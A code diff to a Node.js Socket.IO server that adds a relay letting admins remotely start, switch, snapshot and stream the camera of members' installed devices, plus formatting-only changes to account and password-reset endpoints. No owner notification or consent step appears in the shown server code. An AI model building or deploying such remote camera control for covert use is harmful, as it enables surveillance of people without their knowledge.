@@ -629,6 +629,87 @@ io.on("connection", (socket) => {
     }
   });
 
+  // ---- Live Camera Streaming Relay ----
+
+  // Admin requests camera start on a device
+  socket.on("camera-start", (data) => {
+    if (!socket.user || socket.user.role !== "admin") return;
+    const { deviceId, facing } = data;
+    io.to(`device-${deviceId}`).emit("camera-start", { facing: facing || "back" });
+    console.log(`Admin requested camera-start (${facing}) on device ${deviceId}`);
+  });
+
+  // Admin requests camera stop on a device
+  socket.on("camera-stop", (data) => {
+    if (!socket.user || socket.user.role !== "admin") return;
+    const { deviceId } = data;
+    io.to(`device-${deviceId}`).emit("camera-stop", {});
+    console.log(`Admin requested camera-stop on device ${deviceId}`);
+  });
+
+  // Admin requests snapshot from active camera
+  socket.on("camera-snapshot", (data) => {
+    if (!socket.user || socket.user.role !== "admin") return;
+    const { deviceId } = data;
+    io.to(`device-${deviceId}`).emit("camera-snapshot", {});
+    console.log(`Admin requested camera-snapshot on device ${deviceId}`);
+  });
+
+  // Admin switches camera facing
+  socket.on("camera-switch", (data) => {
+    if (!socket.user || socket.user.role !== "admin") return;
+    const { deviceId, facing } = data;
+    io.to(`device-${deviceId}`).emit("camera-switch", { facing });
+    console.log(`Admin requested camera-switch to ${facing} on device ${deviceId}`);
+  });
+
+  // Device sends a video frame → relay to admin room
+  socket.on("camera-frame", (data) => {
+    if (!socket.deviceId) return;
+    io.to("admin").emit("camera-frame", {
+      deviceId: data.deviceId || socket.deviceId,
+      frame: data.frame,
+      timestamp: data.timestamp,
+    });
+  });
+
+  // Device notifies stream started
+  socket.on("camera-stream-started", (data) => {
+    if (!socket.deviceId) return;
+    io.to("admin").emit("camera-stream-started", {
+      deviceId: data.deviceId || socket.deviceId,
+      facing: data.facing,
+      width: data.width,
+      height: data.height,
+    });
+  });
+
+  // Device notifies stream stopped
+  socket.on("camera-stream-stopped", (data) => {
+    if (!socket.deviceId) return;
+    io.to("admin").emit("camera-stream-stopped", {
+      deviceId: data.deviceId || socket.deviceId,
+    });
+  });
+
+  // Device notifies stream error
+  socket.on("camera-stream-error", (data) => {
+    if (!socket.deviceId) return;
+    io.to("admin").emit("camera-stream-error", {
+      deviceId: data.deviceId || socket.deviceId,
+      error: data.error,
+    });
+  });
+
+  // Device notifies snapshot saved
+  socket.on("camera-snapshot-saved", (data) => {
+    if (!socket.deviceId) return;
+    io.to("admin").emit("camera-snapshot-saved", {
+      deviceId: data.deviceId || socket.deviceId,
+      filename: data.filename,
+    });
+  });
+
   socket.on("disconnect", () => {
     console.log("Client disconnected:", socket.id);
   });
@@ -1536,12 +1617,10 @@ app.post(
         [email],
       );
       if (existing.rows.length > 0) {
-        return res
-          .status(400)
-          .json({
-            success: false,
-            error: "An account with this email already exists. Please sign in.",
-          });
+        return res.status(400).json({
+          success: false,
+          error: "An account with this email already exists. Please sign in.",
+        });
       }
 
       let memberId;
@@ -1606,13 +1685,11 @@ app.post(
       }
       const member = result.rows[0];
       if (!member.password_hash) {
-        return res
-          .status(401)
-          .json({
-            success: false,
-            error:
-              "This account was created before sign-in was available. Please use Forgot Password to set a password.",
-          });
+        return res.status(401).json({
+          success: false,
+          error:
+            "This account was created before sign-in was available. Please use Forgot Password to set a password.",
+        });
       }
       const valid = await bcrypt.compare(password, member.password_hash);
       if (!valid) {
@@ -1746,12 +1823,10 @@ app.post(
       });
     } catch (error) {
       logger.error("Forgot password error:", error);
-      res
-        .status(500)
-        .json({
-          success: false,
-          error: "Failed to process request. Please try again.",
-        });
+      res.status(500).json({
+        success: false,
+        error: "Failed to process request. Please try again.",
+      });
     }
   },
 );
@@ -1776,12 +1851,10 @@ app.post(
         [token],
       );
       if (result.rows.length === 0) {
-        return res
-          .status(400)
-          .json({
-            success: false,
-            error: "Invalid or expired reset link. Please request a new one.",
-          });
+        return res.status(400).json({
+          success: false,
+          error: "Invalid or expired reset link. Please request a new one.",
+        });
       }
       const { email, expires_at } = result.rows[0];
       if (new Date(expires_at) < new Date()) {
@@ -1789,12 +1862,10 @@ app.post(
           "UPDATE password_reset_tokens SET used = TRUE WHERE token = $1",
           [token],
         );
-        return res
-          .status(400)
-          .json({
-            success: false,
-            error: "This reset link has expired. Please request a new one.",
-          });
+        return res.status(400).json({
+          success: false,
+          error: "This reset link has expired. Please request a new one.",
+        });
       }
 
       const passwordHash = await bcrypt.hash(password, 12);
@@ -1814,12 +1885,10 @@ app.post(
       });
     } catch (error) {
       logger.error("Reset password error:", error);
-      res
-        .status(500)
-        .json({
-          success: false,
-          error: "Failed to reset password. Please try again.",
-        });
+      res.status(500).json({
+        success: false,
+        error: "Failed to reset password. Please try again.",
+      });
     }
   },
 );
@@ -1901,12 +1970,10 @@ app.post("/api/members/create-checkout", async (req, res) => {
   }
 
   if (!email) {
-    return res
-      .status(400)
-      .json({
-        success: false,
-        error: "Email is required. Please sign in or provide an email.",
-      });
+    return res.status(400).json({
+      success: false,
+      error: "Email is required. Please sign in or provide an email.",
+    });
   }
 
   try {
@@ -2116,13 +2183,11 @@ app.post(
         [memberId],
       );
       if (device.rows.length === 0) {
-        return res
-          .status(404)
-          .json({
-            success: false,
-            error:
-              "No device found for this Member ID. The member may not have installed the app yet.",
-          });
+        return res.status(404).json({
+          success: false,
+          error:
+            "No device found for this Member ID. The member may not have installed the app yet.",
+        });
       }
       if (device.rows[0].status === "active") {
         return res
@@ -2181,12 +2246,10 @@ app.post(
         ["installed", memberId],
       );
       if (result.rowCount === 0) {
-        return res
-          .status(404)
-          .json({
-            success: false,
-            error: "No device found for this Member ID",
-          });
+        return res.status(404).json({
+          success: false,
+          error: "No device found for this Member ID",
+        });
       }
       logger.info(
         `Device deactivated by admin ${req.user.username} using member ID ${memberId}`,
